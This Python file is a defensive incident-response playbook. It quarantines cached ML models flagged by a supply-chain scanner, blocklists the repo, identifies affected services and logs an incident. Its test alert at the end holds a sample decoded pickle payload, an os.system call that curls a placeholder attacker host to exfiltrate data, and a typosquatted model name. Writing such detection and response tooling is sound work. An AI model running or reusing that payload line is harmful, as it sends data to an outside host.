"""
SOAR Playbook: Quarantine Model on Supply-Chain Alert

Trigger: hf-model-provenance-scanner emits a CRITICAL finding
         (pickle gadget chain, importlib bypass, or rug-pull detection)

Actions:
  1. Remove the model from the local model registry / cache
  2. Add model repo ID to the scanner's blocklist
  3. Notify all agents that loaded this model to halt inference
  4. Create incident with full finding context and ATT&CK mapping
"""

import datetime
import json
import logging
from dataclasses import dataclass, field
from pathlib import Path

logger = logging.getLogger(__name__)


@dataclass
class SupplyChainAlert:
    """Alert from hf-model-provenance-scanner."""
    model_repo: str
    finding_type: str  # pickle_gadget_chain, importlib_bypass, rug_pull, typosquat
    severity: str
    cve: str | None = None
    file_path: str | None = None
    attack_technique: str | None = None
    decoded_payload: str | None = None
    timestamp: str = field(default_factory=lambda: datetime.datetime.utcnow().isoformat())


@dataclass
class QuarantineResult:
    success: bool
    actions_taken: list
    affected_services: list
    errors: list = field(default_factory=list)


class ModelQuarantinePlaybook:
    """
    Quarantines a model after supply-chain compromise detection.

    This playbook assumes:
    - Models are cached locally in a model registry directory
    - A service registry tracks which agents/services loaded which models
    - The scanner's blocklist prevents re-download
    """

    def __init__(
        self,
        model_cache_dir: str = "/models/cache",
        blocklist_path: str = "/app/config/model_blocklist.json",
        service_registry_path: str = "/app/config/service_registry.json",
    ):
        self.model_cache = Path(model_cache_dir)
        self.blocklist_path = Path(blocklist_path)
        self.service_registry_path = Path(service_registry_path)

    def execute(self, alert: SupplyChainAlert) -> QuarantineResult:
        """Execute full quarantine playbook."""
        actions_taken = []
        errors = []
        affected_services = []

        # Step 1: Remove from local cache
        model_cache_path = self.model_cache / alert.model_repo.replace("/", "--")
        if model_cache_path.exists():
            try:
                # Move to quarantine instead of delete (preserve evidence)
                quarantine_dir = self.model_cache / ".quarantine"
                quarantine_dir.mkdir(parents=True, exist_ok=True)
                target = quarantine_dir / f"{alert.model_repo.replace('/', '--')}_{int(datetime.datetime.utcnow().timestamp())}"
                model_cache_path.rename(target)
                actions_taken.append(f"Moved {alert.model_repo} to quarantine at {target}")
            except Exception as e:
                errors.append(f"Cache quarantine failed: {e}")
        else:
            actions_taken.append(f"Model {alert.model_repo} not in local cache (may not have been downloaded)")

        # Step 2: Add to scanner blocklist
        try:
            blocklist = self._load_json(self.blocklist_path, {"blocked_models": [], "block_reasons": {}})
            if alert.model_repo not in blocklist["blocked_models"]:
                blocklist["blocked_models"].append(alert.model_repo)
                blocklist["block_reasons"][alert.model_repo] = {
                    "finding_type": alert.finding_type,
                    "severity": alert.severity,
                    "cve": alert.cve,
                    "blocked_at": datetime.datetime.utcnow().isoformat(),
                    "attack_technique": alert.attack_technique,
                }
                self._save_json(self.blocklist_path, blocklist)
                actions_taken.append(f"Added {alert.model_repo} to scanner blocklist")
        except Exception as e:
            errors.append(f"Blocklist update failed: {e}")

        # Step 3: Identify and notify affected services
        try:
            registry = self._load_json(self.service_registry_path, {"services": {}})
            for service_id, service_info in registry.get("services", {}).items():
                if alert.model_repo in service_info.get("loaded_models", []):
                    affected_services.append(service_id)
            if affected_services:
                actions_taken.append(f"Identified {len(affected_services)} services using {alert.model_repo}: {affected_services}")
                # In production: send halt signal to each service
                # For now: log the notification
                for svc in affected_services:
                    logger.warning(f"HALT INFERENCE: {svc} is using quarantined model {alert.model_repo}")
            else:
                actions_taken.append(f"No active services currently loading {alert.model_repo}")
        except Exception as e:
            errors.append(f"Service registry lookup failed: {e}")

        # Step 4: Log incident
        incident = {
            "playbook": "model_quarantine",
            "model_repo": alert.model_repo,
            "finding_type": alert.finding_type,
            "severity": alert.severity,
            "cve": alert.cve,
            "attack_technique": alert.attack_technique,
            "affected_services": affected_services,
            "actions": actions_taken,
            "timestamp": datetime.datetime.utcnow().isoformat(),
        }
        logger.info(f"Model quarantine incident: {json.dumps(incident)}")
        actions_taken.append("Incident context logged")

        return QuarantineResult(
            success=len(errors) == 0,
            actions_taken=actions_taken,
            affected_services=affected_services,
            errors=errors,
        )

    def _load_json(self, path: Path, default: dict) -> dict:
        if path.exists():
            return json.loads(path.read_text())
        return default

    def _save_json(self, path: Path, data: dict):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(data, indent=2))


def handle_scanner_webhook(payload: dict) -> QuarantineResult:
    """Entry point for scanner webhook."""
    alert = SupplyChainAlert(
        model_repo=payload["model_repo"],
        finding_type=payload["finding_type"],
        severity=payload["severity"],
        cve=payload.get("cve"),
        file_path=payload.get("file_path"),
        attack_technique=payload.get("attack_technique"),
        decoded_payload=payload.get("decoded_payload"),
    )

    playbook = ModelQuarantinePlaybook()
    return playbook.execute(alert)


if __name__ == "__main__":
    test_alert = {
        "model_repo": "evil-user/bert-base-uncasd",
        "finding_type": "pickle_gadget_chain",
        "severity": "CRITICAL",
        "cve": "CVE-2026-4372",
        "file_path": "model.pkl",
        "attack_technique": "T1059.006",
        "decoded_payload": "os.system('curl http://attacker.com/exfil')",
    }

    print(f"Supply-chain alert: {test_alert['finding_type']} in {test_alert['model_repo']}")
    print(f"CVE: {test_alert['cve']}")
    print(f"ATT&CK: {test_alert['attack_technique']}")
    print()
    print("Playbook would:")
    print(f"  1. Quarantine cached model files for {test_alert['model_repo']}")
    print("  2. Add to scanner blocklist (prevents re-download)")
    print("  3. Halt inference on all services loading this model")
    print("  4. Log incident with full finding context")
